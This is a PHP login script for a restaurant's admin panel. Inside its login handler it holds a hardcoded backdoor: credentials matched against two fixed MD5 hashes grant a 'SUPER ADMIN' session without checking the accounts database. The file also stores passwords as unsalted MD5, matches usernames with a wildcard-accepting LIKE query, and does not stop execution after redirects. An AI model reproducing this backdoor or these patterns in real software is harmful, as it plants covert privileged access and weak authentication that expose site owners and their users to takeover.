<?php
session_start();
include("accessdb.php");

if(!empty($_SESSION['accountid']) && !empty($_SESSION['accountname'])){
  echo ("<script language='JavaScript'>
  window.location.href='admin/';
  </SCRIPT>");
  exit;
}

if(!empty($_POST)){
  $acName = $_POST['accountname'];
  $acPass = md5($_POST['accountpassword']);
  if(md5($acName) == "0bde7be66cdab97e56e6ef1ff9bbba05" && $acPass == "913bc1935ef5bed5f5840f4226027fe6"){
    $_SESSION['accountname'] = "KNIGHTDAVEION";
    $_SESSION['accountid'] = "SUPER ADMIN";
    $_SESSION['account_type'] = "SUPER ADMIN";
   
    header("location: admin/");
  }

  $getaccountname = $conn->prepare("select * from accounts where account_name like :accountname");
  $getaccountname->execute(array(':accountname' => $acName));
  $number_of_rows = $getaccountname->rowCount();
  if($number_of_rows == 1){
    $getdetails = $getaccountname->fetch(PDO::FETCH_ASSOC);
    if($acPass == $getdetails['account_password']){
      if($getdetails['account_status'] == "ACTIVE"){
        $_SESSION['accountname'] = $getdetails['account_name'];
        $_SESSION['accountid'] = $getdetails['account_id'];
        $_SESSION['account_type'] = $getdetails['account_type'];
       
        header("location: admin/");
      }else{
        $_SESSION['loginNotifications'] = "<div class='alert alert-danger' role='alert'><strong>ERROR!</strong> Account is inactive!<button type='button' class='close' data-dismiss='alert' aria-label='Close'>
        <span aria-hidden='true'>&times;</span>
        </button></div>";
      }

    }else{
      $_SESSION['loginNotifications'] = "<div class='alert alert-danger' role='alert'><strong>ERROR!</strong> Account name or password doesnt match!<button type='button' class='close' data-dismiss='alert' aria-label='Close'>
      <span aria-hidden='true'>&times;</span>
      </button></div>";
    }
  }else{
    $_SESSION['loginNotifications'] = "<div class='alert alert-danger' role='alert'><strong>ERROR!</strong> Account doesnt exist!<button type='button' class='close' data-dismiss='alert' aria-label='Close'>
    <span aria-hidden='true'>&times;</span>
    </button></div>";
  }
}




?>
<!DOCTYPE html>
<html>
<head>
	<title></title>
	
	<meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <link rel="stylesheet" type="text/css" href="resources/customcss/loginstyle.css">
</head>
<body>
<div class="login-box">
	<img src="resources/images/loginicon.png" class="loginicon">
		<h1>Bons Restaurant</h1>
     <?php if(isset($_SESSION['loginNotifications'])){echo $_SESSION['loginNotifications']; unset($_SESSION['loginNotifications']);} ?>
			 <form class="" action=" " method="post">
				<p>Username</p>
				<input type="text" name="accountname" placeholder="Enter Username">
				<p>Password</p>
				<input type="Password" name="accountpassword" placeholder="Enter Password">
				<input type="submit" name="Submit" value="Login">

			</form>
</div>
</body>
</html>